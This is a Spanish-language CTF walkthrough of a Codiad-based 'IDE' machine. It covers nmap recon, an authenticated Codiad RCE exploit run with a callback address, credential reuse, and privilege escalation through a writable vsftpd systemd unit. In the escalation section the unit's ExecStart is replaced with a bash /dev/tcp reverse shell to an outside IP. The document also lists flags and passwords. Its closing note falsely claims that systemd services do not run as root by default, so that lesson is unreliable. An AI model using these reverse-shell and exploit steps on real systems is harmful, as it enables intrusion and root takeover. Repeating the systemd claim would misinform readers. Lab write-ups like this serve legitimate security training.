# CTF Writeup – IDE (Codiad)

---

## 📋 Información General

|Campo|Valor|
|---|---|
|**Plataforma**|HackTheBox|
|**Dificultad**|Medium|
|**OS**|Linux|
|**IP**|`10.67.142.189`|
|**Fecha**|31/01/2026|
|**Puntos**|N/A|

**Tags:** #ctf #hackthebox #medium #linux #codiad #privesc #systemd

---

## 🎯 Objetivo

-  User Flag: `02930d21a8eb009f6d26361b2d24a466`
    
-  Root Flag: `ce258cb16f47f1c66f0b0b77f4e0fb8d`
    

---

## 🔎 Reconocimiento

### Nmap Scan

**Comando:**

`nmap -sC -sV -p- 10.67.142.189`

**Resultado (resumen):**

`22/tcp   open  ssh 80/tcp   open  http 62337/tcp open http`

### Puertos Abiertos

|Puerto|Servicio|Versión|
|---|---|---|
|22|SSH|OpenSSH|
|80|HTTP|Apache|
|62337|HTTP|Apache|

---

## 🛠️ Herramientas Utilizadas

- **Reconocimiento:**
    
    - `nmap`
        
    - `gobuster`
        
- **Explotación:**
    
    - `hydra`
        
    - Exploit Codiad 2.8.4 (CVE-2018-14009)
        
- **Post-explotación:**
    
    - `linpeas`
        
    - `nc`
        
    - `systemd`
        

---

## 🌐 Enumeración Web

### Directorios Interesantes

- `/codiad/` – IDE web vulnerable
    
- `/components/user/controller.php` – Endpoint de autenticación AJAX
    

### Tecnologías Detectadas

- **CMS:** Codiad 2.8.4
    
- **Lenguaje:** PHP
    
- **Backend:** Apache
    
- **Auth:** AJAX (JSON response)
    

---

## 💣 Vulnerabilidades Encontradas

### [VULN-001] Codiad 2.8.4 – Authenticated RCE

**Severidad:** Alta  
**CVE:** CVE-2018-14009

**Descripción:**  
Usuarios autenticados pueden ejecutar comandos arbitrarios mediante inyección en el file manager de Codiad.

**Impacto:**

- Ejecución remota de comandos
    
- Obtención de reverse shell
    

---

## 🚀 Explotación

### Initial Access

**Vulnerabilidad explotada:** Codiad Authenticated RCE

**Credenciales obtenidas:**

`Usuario: john Password: password`

**Exploit usado:**

`python3 49705.py \ http://10.67.142.189:62337/ \ john \ password \ 192.168.167.92 \ 4444 \ linux`

**Shell obtenida como:** `www-data`

### Movimiento lateral

Se encontró la contraseña del usuario **drac**, permitiendo cambiar de usuario:

`su drac`

**User Flag:**

`cat /home/drac/user.txt 02930d21a8eb009f6d26361b2d24a466`

---

## 📈 Escalación de Privilegios

### Enumeración del Sistema

`sudo -l`

**Resultado:**

`User drac may run the following commands on ide: (ALL : ALL) /usr/sbin/service vsftpd restart`

### Vector de Escalación

**Método usado:** Abuso de servicio systemd mal configurado

El archivo del servicio era **escribible por drac**:

`/lib/systemd/system/vsftpd.service`

Se modificó el servicio para ejecutar una reverse shell como root:

`[Service] Type=simple User=root ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.167.92/1234 0>&1'`

Luego:

`systemctl daemon-reload sudo /usr/sbin/service vsftpd restart`

### Root Flag

`cat /root/root.txt ce258cb16f47f1c66f0b0b77f4e0fb8d`

---

## 🔑 Credenciales Encontradas

|Usuario|Contraseña|Ubicación|
|---|---|---|
|john|password|Codiad|
|drac|Th3dRaCULa1sR3aL|Post-explotación|

---

## 💡 Lecciones Aprendidas

- Hydra puede fallar si el endpoint real es AJAX y no el form HTML
    
- Codiad 2.8.4 sigue siendo crítico si está expuesto
    
- **systemd + sudo limitado = privesc clásica**
    
- Un servicio mal protegido es equivalente a root
    

---

## 🔗 Referencias

- [https://nvd.nist.gov/vuln/detail/CVE-2018-14009](https://nvd.nist.gov/vuln/detail/CVE-2018-14009)
    
- [https://www.exploit-db.com/exploits/49705](https://www.exploit-db.com/exploits/49705)
    
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
    

---

### Nota – `User=root` en `vsftpd.service`

El servicio **no se ejecutaba como root** porque `systemd` **no asume root por defecto** si no se indica explícitamente el usuario.  
Aunque `drac` podía reiniciar el servicio con `sudo`, el proceso se lanzaba como un usuario no privilegiado (`vsftpd`, `ftp` o `nobody`), por lo que la reverse shell fallaba o no tenía permisos.

Al agregar:

`User=root`

se fuerza a `systemd` a ejecutar `ExecStart` como **UID 0**, logrando ejecución de comandos como root al reiniciar el servicio.

**Conclusión:**  
Si un usuario puede **modificar un archivo `.service` y reiniciarlo**, puede escalar a root especificando `User=root`.

---

**Status:** 